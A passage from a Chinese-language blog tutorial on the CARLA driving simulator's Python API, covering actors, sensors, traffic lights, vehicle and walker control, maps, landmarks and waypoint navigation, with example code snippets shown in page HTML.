找到所有可以作为初始点的位置并随机选择一个</span></span><br><span class="line">transform = random.choice(world.get_map().get_spawn_points())</span><br><span class="line"><span class="built_in">print</span>(transform)</span><br><span class="line"><span class="comment"># 在这个位置生成汽车</span></span><br><span class="line">ego_vehicle = world.spawn_actor(ego_vehicle_bp, transform)</span><br></pre></td></tr></table></figure><h4 id="2-4-2管理"><a href="#2-4-2管理" class="headerlink" title="2.4.2管理"></a>2.4.2管理</h4><p>carla.Actor 主要由 get() 和 set() 方法组成，用于管理地图周围的演员。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Handle Actor</span></span><br><span class="line"><span class="built_in">print</span>(actor.get_acceleration())</span><br><span class="line"><span class="built_in">print</span>(actor.get_velocity())</span><br><span class="line"></span><br><span class="line">location = actor.get_location()</span><br><span class="line">location.z += <span class="number">10.0</span></span><br><span class="line">actor.set_location(location)</span><br></pre></td></tr></table></figure><p>可以禁用 actor 的物理，将其冻结在某位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">actor.set_simulate_physics(<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(actor.get_location())</span><br></pre></td></tr></table></figure><p>除此之外，actor还有他们的蓝图提供的标签，这些标签主要用于语义分割传感器。</p><p><strong>注意：大多数方法异步地向模拟器发送请求。模拟器在每次更新时解析它们的时间是有限的。用 set ()方法充斥模拟器将会积累一个显著的延迟。</strong></p><h4 id="2-4-3销毁"><a href="#2-4-3销毁" class="headerlink" title="2.4.3销毁"></a>2.4.3销毁</h4><p>当 Python 脚本完成时，Actor 不会被销毁，需要明确地手动销毁他们。销毁会阻塞仿真，直到完成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">destroyed_sucessfully = actor.destroy() <span class="comment"># Returns True if successful</span></span><br></pre></td></tr></table></figure><h3 id="2-5Actor类型"><a href="#2-5Actor类型" class="headerlink" title="2.5Actor类型"></a>2.5Actor类型</h3><h4 id="2-5-1-传感器"><a href="#2-5-1-传感器" class="headerlink" title="2.5.1 传感器"></a>2.5.1 传感器</h4><p>传感器是产生数据流的actor。在官方文档的第四部分和本文档接下来的部分会单独介绍。现在，让我们看看一个常见的传感器产生周期。此示例生成一个摄像机传感器，将其连接到车辆上，并告诉摄像机将生成的图像保存到磁盘。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">camera_bp = blueprint_library.find(<span class="string">&#x27;sensor.camera.rgb&#x27;</span>)</span><br><span class="line">camera = world.spawn_actor(camera_bp, relative_transform, attach_to=my_vehicle)</span><br><span class="line">camera.listen(<span class="keyword">lambda</span> image: image.save_to_disk(<span class="string">&#x27;output/%06d.png&#x27;</span> % image.frame))</span><br></pre></td></tr></table></figure><ul><li>传感器也有蓝图，可以设置属性</li><li>大多数传感器将连接到车辆，收集有关其周围环境的信息</li><li>传感器监听数据。接收到数据后，他们调用 Lambda表达式 描述的函数</li></ul><p>只设置了以上的回调，并不会保存传感器数据，需要调用 world.tick() 获取传感器数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Main loop</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># Tick the server</span></span><br><span class="line">    world.tick()</span><br><span class="line">    w_frame = world.get_snapshot().frame</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;World&#x27;s frame: %d&quot;</span> % w_frame)</span><br></pre></td></tr></table></figure><p>运行脚本的控制台打印世界的当前帧数，rgb 图像会保存在磁盘里。默认情况下 sensor.camera.rgb 产生的图像分辨率是 800 x 600，这个可以设定。</p><h4 id="2-5-2-旁观者"><a href="#2-5-2-旁观者" class="headerlink" title="2.5.2 旁观者"></a>2.5.2 旁观者</h4><p>由虚幻引擎放置以提供游戏内视角。 它可以用来移动模拟器窗口的视图。 以下示例将移动旁观者演员，以将视线指向所需的车辆。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">spectator = world.get_spectator()</span><br><span class="line">transform = vehicle.get_transform()</span><br><span class="line">spectator.set_transform(carla.Transform(transform.location + carla.Location(z=<span class="number">50</span>),</span><br><span class="line">carla.Rotation(pitch=-<span class="number">90</span>)))</span><br></pre></td></tr></table></figure><h4 id="2-5-3-交通标志和交通灯"><a href="#2-5-3-交通标志和交通灯" class="headerlink" title="2.5.3 交通标志和交通灯"></a>2.5.3 交通标志和交通灯</h4><p>到目前为止，在 CARLA 中，只有停止点、生成和红绿灯被认为是演员。 其余的 OpenDRIVE 标志可从 API 作为 carla.Landmark 访问。 使用这些实例可以访问它们的信息，但它们在模拟中不作为参与者存在。 在下方的“地图和导航”有对地标更详细的解释。</p><p>当模拟开始时，使用 OpenDRIVE 文件中的信息自动生成停止、生成和交通灯。这些都不能在蓝图库中找到，因此不能产生。</p><p>CARLA 地图在 OpenDRIVE 文件中没有交通标志和灯光，这些都是由开发人员手动放置的。</p><p>道路图本身并没有界定交通标志。相反，他们有一个 carla.BoundingBox边界框影响其中的车辆。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Get the traffic light affecting a vehicle</span></span><br><span class="line"><span class="keyword">if</span> vehicle_actor.is_at_traffic_light():</span><br><span class="line">    traffic_light = vehicle_actor.get_traffic_light()</span><br></pre></td></tr></table></figure><p>交通信号灯出现在路口。 与任何actor一样，他们有自己的唯一 ID，但也有交汇点的组 ID。 为了识别同一组中的交通灯，使用了杆 ID。</p><p>同一组中的红绿灯遵循一个循环。 第一个设置为绿色，而其余的则保持为红色。 活跃的在绿色、黄色和红色上花费几秒钟，所以有一段时间所有的灯都是红色的。 然后，下一个红绿灯开始循环，前一个红绿灯与其他红绿灯一起冻结。</p><p>可以使用 API 设置交通灯的状态。 在每个状态上花费的秒数也是如此。 carla.TrafficLightState 将可能的状态描述为一系列枚举值。</p><p>交通信号灯的状态可以通过 API 设置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Set traffic light state</span></span><br><span class="line">traffic_light = vehicle.get_traffic_light()</span><br><span class="line"><span class="built_in">print</span>(traffic_light)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change a red traffic light to green （未验证，因为找不到 traffic_light）</span></span><br><span class="line"><span class="keyword">if</span> traffic_light.get_state() == carla.TrafficLightState.Red:</span><br><span class="line">    traffic_light.set_state(carla.TrafficLightState.Green)</span><br><span class="line">    traffic_light.set_set_green_time(<span class="number">4.0</span>)</span><br></pre></td></tr></table></figure><p><strong>注意：只有当红灯亮时，车辆才会注意到红灯。</strong></p><h4 id="2-5-4-车辆"><a href="#2-5-4-车辆" class="headerlink" title="2.5.4 车辆"></a>2.5.4 车辆</h4><p>carla.Vehicle 是一种特殊类型的演员。 它包含模拟轮式车辆物理特性的特殊内部组件。 这是通过应用四种不同的控件来实现的：</p><ul><li>carla.VehicleControl 为油门、转向、刹车等驾驶命令提供输入。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vehicle.apply_control(carla.VehicleControl(throttle=<span class="number">1.0</span>, steer=-<span class="number">1.0</span>))</span><br></pre></td></tr></table></figure><ul><li>carla.VehiclePhysicsControl 定义了车辆的物理属性并包含另外两个控制器：</li><li>carla.GearPhysicsControl 控制齿轮。</li><li>carla.WheelPhysicsControl 提供对每个车轮的特定控制。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vehicle.apply_physics_control(carla.VehiclePhysicsControl(max_rpm = <span class="number">5000.0</span>, center_of_mass = carla.Vector3D(<span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>), torque_curve=[[<span class="number">0</span>,<span class="number">400</span>],[<span class="number">5000</span>,<span class="number">400</span>]]))</span><br></pre></td></tr></table></figure><p>车辆有一个碰撞体积 carla.BoundingBox 。 此边界框允许将物理应用到车辆并检测碰撞。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">box = vehicle.bounding_box</span><br><span class="line"><span class="built_in">print</span>(box.location)         <span class="comment"># Location relative to the vehicle.</span></span><br><span class="line"><span class="built_in">print</span>(box.extent)           <span class="comment"># XYZ half-box extents in meters.</span></span><br></pre></td></tr></table></figure><p>通过启用扫描轮碰撞参数可以<strong>改善车轮的物理特性</strong>。 默认的车轮物理场对每个车轮使用从轴到地板的单射线投射，但是当启用扫描车轮碰撞时，会检查车轮的整个体积以防止碰撞。 它可以这样启用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">physics_control = vehicle.get_physics_control()</span><br><span class="line">physics_control.use_sweep_wheel_collision = <span class="literal">True</span></span><br><span class="line">vehicle.apply_physics_control(physics_control)</span><br></pre></td></tr></table></figure><p>车辆包括其他独有的功能：</p><ul><li>自动驾驶模式将为车辆订阅交通管理器以模拟真实的城市状况。 这个模块是硬编码的，不是基于机器学习的。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vehicle.set_autopilot(<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><ul><li>车灯必须由用户打开和关闭。 每辆车都有一组在 carla.VehicleLightState 中列出的灯。 并非所有车辆都集成了照明灯。 在撰写本文时，集成车灯的车辆如下：<br>  自行车：所有自行车都有前后位置灯。<br>  摩托车：雅马哈和哈雷戴维森车型。<br>  汽车：奥迪 TT、雪佛兰 Impala、道奇警车、道奇 Charger、奥迪 e-tron、林肯 2017 和 2020、野马、特斯拉 Model 3、特斯拉 Cybertruck、大众 T2 和梅赛德斯 C 级。</li></ul><p>可以使用方法 carla.Vehicle.get_light_state 和 carla.Vehicle.set_light_state 随时检索和更新车辆的灯光。 这些使用二进制操作来自定义灯光设置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Turn on position lights</span></span><br><span class="line">current_lights = carla.VehicleLightState.NONE</span><br><span class="line">current_lights |= carla.VehicleLightState.Position</span><br><span class="line">vehicle.set_light_state(current_lights)</span><br></pre></td></tr></table></figure><p>根据部分博主的内容实验以及本机实验，二进制操作灯光并不稳定（在很多情况下失败），因此建议把上方的第一第二行代码改为current_lights &#x3D; carla.VehicleLightState.Position直接设置。</p><h4 id="2-5-5行人"><a href="#2-5-5行人" class="headerlink" title="2.5.5行人"></a>2.5.5行人</h4><p>carla.Walker 的工作方式与车辆类似。 对它们的控制由controllers提供。</p><ul><li>carla.WalkerControl 以一定的方向和速度移动行人。 它还允许他们跳跃。</li><li>carla.WalkerBoneControl 提供对 3D 骨架的控制。</li></ul><p>步行者可以由 AI controller 控制。 他们没有自动驾驶模式。 carla.WalkerAIController Actor 围绕它所连接的 Actor 移动。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">walker_controller_bp = world.get_blueprint_library().find(<span class="string">&#x27;controller.ai.walker&#x27;</span>)</span><br><span class="line">world.SpawnActor(walker_controller_bp, carla.Transform(), parent_walker)</span><br></pre></td></tr></table></figure><p>每个 AI controller都需要初始化、目标和速度（可选）。 停止控制器的工作方式相同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ai_controller.start()</span><br><span class="line">ai_controller.go_to_location(world.get_random_location_from_navigation())</span><br><span class="line">ai_controller.set_max_speed(<span class="number">1</span> + random.random())  <span class="comment"># Between 1 and 2 m/s (default is 1.4 m/s).</span></span><br><span class="line">...</span><br><span class="line">ai_controller.stop()</span><br></pre></td></tr></table></figure><p>注意：AI controller是没有身体的，没有物理。它不会出现在现场。而且，相对于其父节点的位置(0,0,0)不会引起冲突。</p><p>当行人到达目标位置时，他们会自动步行到另一个随机点。 如果无法到达目标点，步行者将前往离他们当前位置最近的点。</p><p><strong>注意：如果要删除AI行人，需要停止AI controller，并且清除所有的actor和controller。</strong></p><p>carla.Client 中的一个片段使用批量生成大量步行者并让他们四处游荡。</p><h3 id="2-6-地图"><a href="#2-6-地图" class="headerlink" title="2.6 地图"></a>2.6 地图</h3><p>地图包括城镇的 3D 模型及其道路定义。 地图的道路定义基于 OpenDRIVE 文件，这是一种标准化、带注释的道路定义格式。 OpenDRIVE 标准 1.4 定义道路、车道、交叉口等的方式决定了 Python API 的功能以及决策背后的推理。</p><p>Python API 充当高级查询系统来导航这些道路。 它不断发展以提供更广泛的工具集。后面会单独提到python API</p><h4 id="2-6-1-改变地图"><a href="#2-6-1-改变地图" class="headerlink" title="2.6.1 改变地图"></a>2.6.1 改变地图</h4><p>要改变地图，世界也必须改变。 模拟将从头开始重新创建。 您可以在新世界中使用同一张地图重新开始，也可以同时更改地图和世界：</p><ul><li>reload_world() 在同一张地图里创建一个新的实例</li><li>load_world() 改变当前地图，并创建一个新的世界</li></ul><p>每张地图都有一个与当前加载的城市名称相匹配的<code>name</code>属性，例如 <em>Town01</em>，可以用client.get_available_maps()来获取可用地图列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加载地图</span></span><br><span class="line">world = client.load_world(<span class="string">&#x27;Town01&#x27;</span>)</span><br><span class="line"><span class="comment"># world = client.reload_world()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取可用地图列表</span></span><br><span class="line"><span class="built_in">print</span>(client.get_available_maps())</span><br></pre></td></tr></table></figure><h4 id="2-6-2-地标"><a href="#2-6-2-地标" class="headerlink" title="2.6.2 地标"></a>2.6.2 地标</h4><p>OpenDRIVE 种定义的交通标志将转换为 CARLA 的 landmark 对象，使用 API 查询：</p><ul><li>carla.Landmark 对象代表 OpenDRIVE 信号。 此类的属性和方法描述了地标及其影响范围。</li><li>carla.LandmarkOrientation 说明地标相对于道路几何定义的方向。</li><li>carla.LandmarkType 包含常见的地标类型，以便于转换为 OpenDRIVE 类型。</li><li>carla.Waypoint 可以获得位于其前方一定距离的地标。 可以指定要获取的地标类型。</li><li>carla.Map 检索地标集。 它可以返回地图中的所有地标，或者具有共同 ID、类型或组的地标。</li><li>carla.World 充当地标与在模拟中代表它们的 carla.TrafficSign 和 carla.TrafficLight 之间的中介。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取地标</span></span><br><span class="line"><span class="built_in">print</span>(world)</span><br><span class="line"><span class="built_in">map</span> = world.get_map()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">map</span>)</span><br><span class="line">waypoints = <span class="built_in">map</span>.generate_waypoints(<span class="number">100000</span>)</span><br><span class="line"><span class="built_in">print</span>(waypoints)</span><br><span class="line">waypoint = waypoints[<span class="number">4</span>]</span><br><span class="line"><span class="built_in">print</span>(waypoint)</span><br><span class="line">landmarks = waypoint.get_landmarks(<span class="number">20000.0</span>, <span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(landmarks)</span><br></pre></td></tr></table></figure><h4 id="2-6-3航点"><a href="#2-6-3航点" class="headerlink" title="2.6.3航点"></a>2.6.3航点</h4><p>carla.Waypoint 是 CARLA 世界中的 3D 定向点，对应于 OpenDRIVE 车道。 与航点相关的一切都发生在客户端； 只需与服务器通信一次即可获取包含航点信息的地图对象。</p><p>每个航路点都包含一个 carla.Transform，它说明了它在地图上的位置以及包含它的车道的方向。 变量 road_id、section_id、lane_id 和 s 对应于 OpenDRIVE 道路。 路点的 id 由这四个值的哈希组合构成。</p><p>航路点保存有关包含它的车道的信息。 此信息包括车道的左右车道标记、确定车道是否在交叉路口内的布尔值、车道类型、宽度和车道变更权限。</p><p><strong>注意：同一条道路上距离小于2厘米的路标共用相同的id。</strong></p><p>航点还包含他所在的车道信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Access lane information from a waypoint</span></span><br><span class="line">inside_junction = waypoint.is_junction</span><br><span class="line"><span class="built_in">print</span>(inside_junction)</span><br><span class="line">width = waypoint.lane_width</span><br><span class="line"><span class="built_in">print</span>(width)</span><br><span class="line">right_lm_color = waypoint.right_lane_marking.color</span><br><span class="line"><span class="built_in">print</span>(right_lm_color)</span><br><span class="line"><span class="built_in">print</span>(waypoint.transform)</span><br></pre></td></tr></table></figure><h4 id="2-6-4-车道"><a href="#2-6-4-车道" class="headerlink" title="2.6.4 车道"></a>2.6.4 车道</h4><p>OpenDRIVE 标准 1.4 定义的车道类型作为一系列枚举值转换为 carla.LaneType 中的 API。</p><p>车道周围的车道标记可通过 carla.LaneMarking 访问。 车道标记由一系列变量定义：</p><ul><li>颜色：carla.LaneMarkingColor 是定义标记颜色的枚举值。</li><li>变道：carla.LaneChange 说明车道是否允许左转、右转、两者都允许或不允许。</li><li>类型：carla.LaneMarkingType 是根据 OpenDRIVE 标准定义标记类型的枚举值。</li><li>宽度：定义标记的厚度。</li></ul><p>下面的示例显示了获取有关特定航路点的车道类型、车道标记和车道变更权限的信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Get the lane type where the waypoint is</span></span><br><span class="line">lane_type = waypoint.lane_type</span><br><span class="line"><span class="built_in">print</span>(lane_type)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the type of lane marking on the left</span></span><br><span class="line">left_lanemarking_type = waypoint.left_lane_marking.<span class="built_in">type</span></span><br><span class="line"><span class="built_in">print</span>(left_lanemarking_type)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get available lane changes for this waypoint</span></span><br><span class="line">lane_change = waypoint.lane_change</span><br><span class="line"><span class="built_in">print</span>(lane_change)</span><br></pre></td></tr></table></figure><h4 id="2-6-5-路口"><a href="#2-6-5-路口" class="headerlink" title="2.6.5 路口"></a>2.6.5 路口</h4><p>carla.Junction 表示 OpenDRIVE 连接点。 此类包含一个带有边界框的交叉路口，以识别其中的车道或车辆。</p><p>carla.Junction 类包含 get_waypoints 方法，该方法为路口内的每条车道返回一对航路点。 每对都位于交汇点边界的起点和终点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取路口</span></span><br><span class="line">junction = waypoint.get_junction()</span><br><span class="line"><span class="built_in">print</span>(junction)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取路口范围的航路点</span></span><br><span class="line">waypoints_junc = junction.get_waypoints(carla.LaneType.<span class="type">Any</span>)</span><br><span class="line"><span class="built_in">print</span>(waypoints_junc)</span><br></pre></td></tr></table></figure><h4 id="2-6-6-环境对象"><a href="#2-6-6-环境对象" class="headerlink" title="2.6.6 环境对象"></a>2.6.6 环境对象</h4><p>CARLA 地图上的每个对象都有一组相关变量，可在此处找到。 详见 carla.EnvironmentObject。这些变量中包含一个唯一 ID，可用于切换该对象在地图上的可见性。 您可以使用 Python API 根据语义标签获取每个环境对象的 ID：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Get the building in the world</span></span><br><span class="line">env_objs = world.get_environment_objects(carla.CityObjectLabel.Buildings)</span><br><span class="line"><span class="built_in">print</span>(env_objs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Access individual building IDs and save in a set</span></span><br><span class="line">building_01 = env_objs[<span class="number">0</span>]</span><br><span class="line">building_02 = env_objs[<span class="number">1</span>]</span><br><span class="line">objects_to_toggle = &#123;building_01.<span class="built_in">id</span>, building_02.<span class="built_in">id</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(objects_to_toggle)</span><br><span class="line"></span><br><span class="line">spectator = world.get_spectator()</span><br><span class="line">spectator.set_transform(carla.Transform(building_01.transform.location + carla.Location(<span class="number">0</span>,<span class="number">0</span>,<span class="number">30</span>),</span><br><span class="line">    carla.Rotation(pitch=-<span class="number">90</span>)))</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Toggle buildings off</span></span><br><span class="line">world.enable_environment_objects(objects_to_toggle, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># Toggle buildings on</span></span><br><span class="line">world.enable_environment_objects(objects_to_toggle, <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="2-7-CARLA中的导航"><a href="#2-7-CARLA中的导航" class="headerlink" title="2.7 CARLA中的导航"></a>2.7 CARLA中的导航</h3><p>CARLA 中的导航是通过 Waypoint API 管理的，它是 carla.Waypoint 和 carla.Map 方法的组合。</p><p>客户端必须首先与服务器通信以检索包含航点信息的地图对象。 这只需要一次，所有后续查询都在客户端执行。</p><h4 id="2-7-1-通过航点导航"><a href="#2-7-1-通过航点导航" class="headerlink" title="2.7.1 通过航点导航"></a>2.7.1 通过航点导航</h4><p>Waypoint API 公开了一些方法，这些方法允许路点相互连接并沿着道路构建路径供车辆导航：</p><ul><li>next(d) 在车道方向上创建近似距离 d 内的航路点列表。 该列表包含每个可能偏差的一个航路点。</li><li>previous(d) 创建一个航路点列表，航路点在车道相反方向的近似距离 d 内。 该列表包含每个可能偏差的一个航路点。</li><li>next_until_lane_end(d) 和 previous_until_lane_start(d) 返回相距 d 的航路点列表。 这些列表分别从当前航路点到其车道的终点和起点。</li><li>get_right_lane() 和 get_left_lane() 返回相邻车道中的等效航路点（如果存在）。 可以通过在其右&#x2F;左车道上找到下一个航路点并移动到该航路点来进行变道操作。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Find next waypoint 2 meters ahead.</span></span><br><span class="line">waypoint = waypoint.<span class="built_in">next</span>(<span class="number">2.0</span>)</span><br></pre></td></tr></table></figure><p>以下代码，生成车辆，获取航路点。关闭车辆的物理模拟，在 loop 中获取下一个航路点，将车辆 transform 设置到航路点位置，同时将 spectator 设置到当前车辆位置上方俯视观察：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_spectator_transform</span>(<span class="params">in_transform</span>):</span><br><span class="line">    spectator = world.get_spectator()</span><br><span class="line">    spectator.set_transform(carla.Transform(in_transform.location + carla.Location(<span class="number">0</span>,<span class="number">0</span>,<span class="number">30</span>),</span><br><span class="line">        carla.Rotation(pitch=-<span class="number">90</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Spawn vehicle</span></span><br><span class="line">vehicle_bp = world.get_blueprint_library().find(<span class="string">&#x27;vehicle.audi.tt&#x27;</span>)</span><br><span class="line">spawn_point = random.choice(<span class="built_in">map</span>.get_spawn_points())</span><br><span class="line">vehicle = world.spawn_actor(vehicle_bp, spawn_point)</span><br><span class="line">set_spectator_transform(vehicle.get_transform())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get waypoint</span></span><br><span class="line">waypoint = <span class="built_in">map</span>.get_waypoint(vehicle.get_location())</span><br><span class="line"><span class="built_in">print</span>(waypoint)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable physics, in this example the vehicle is teleported</span></span><br><span class="line">vehicle.set_simulate_physics(<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># Find next waypoint 2 meters ahead</span></span><br><span class="line">    waypoint = random.choice(waypoint.<span class="built_in">next</span>(<span class="number">0.2</span>))</span><br><span class="line">    <span class="comment"># waypoint = waypoint.next(2.0)</span></span><br><span class="line">    <span class="built_in">print</span>(waypoint)</span><br><span class="line">    <span class="comment"># Teleport the vehicle</span></span><br><span class="line">    vehicle.set_transform(waypoint.transform)</span><br><span class="line">    set_spectator_transform(waypoint.transform)</span><br></pre></td></tr></table></figure><p>有一种纯数学方法的航点导航法，似乎已经无法使用，具体原因我水平太低经过无数测试也没找出来。</p><h4 id="2-7-2-生成地图导航"><a href="#2-7-2-生成地图导航" class="headerlink" title="2.7.2 生成地图导航"></a>2.7.2 生成地图导航</h4><p>客户端需要向服务器发出请求以获取 .xodr 映射文件并将其解析为 carla.Map 对象。 这只需要执行一次。</p><p>这里补充一点OpenDRIVE的知识：</p><p>OpenDRIVE格式是以可扩展标记语言(XML)为基础，文件后缀为xodr格式的描述道路及道路网的通用标准。存储在OpenDRIVE文件中的数据描述了道路的几何形状以及沿线的特征并且定义了可以影响交通逻辑的交通标志以及道路基础设施，例如车道和信号灯。</p><p>路网是OpenDRIVE文件中描述的道路信息，其既是基于经验建造的，也可以是依据真实道路数据生成的。OpenDRIVE的主要目的是提供一种可用于仿真模拟的道路网络描述，并且可以使得这些道路以及道路网的描述可以在仿真平台或仿真软件中被自定义或改变。</p><p>OpenDRIVE根据XML的格式以节点和元素描述道路中各类信息。这样的通用格式有助于虚拟仿真测试的高度专业化，并且可以保持不同国家之间数据交换所需的相互操作性。</p><p>获取地图对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span> = world.get_map()</span><br></pre></td></tr></table></figure><p>地图对象包含用于创建车辆的推荐生成点。 您可以使用以下方法获取这些生成点的列表，每个生成点都包含一个 carla.Transform。 请记住，生成点可能已经被占用，导致由于碰撞而无法创建车辆。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawn_points = world.get_map().get_spawn_points()</span><br></pre></td></tr></table></figure><p>您可以通过获取最接近特定位置或地图 OpenDRIVE 定义中的特定 road_id、lane_id 和 s 值的航点来开始使用航点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nearest waypoint in the center of a Driving or Sidewalk lane.</span></span><br><span class="line">waypoint01 = <span class="built_in">map</span>.get_waypoint(vehicle.get_location(),project_to_road=<span class="literal">True</span>, lane_type=(carla.LaneType.Driving | carla.LaneType.Sidewalk))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Nearest waypoint but specifying OpenDRIVE parameters. </span></span><br><span class="line">waypoint02 = <span class="built_in">map</span>.get_waypoint_xodr(road_id,lane_id,s)</span><br></pre></td></tr></table></figure><p>下面的示例显示了如何生成航点集合以可视化城市车道。 这将在地图上为每条道路和车道创建航点。 它们都将相距约 2 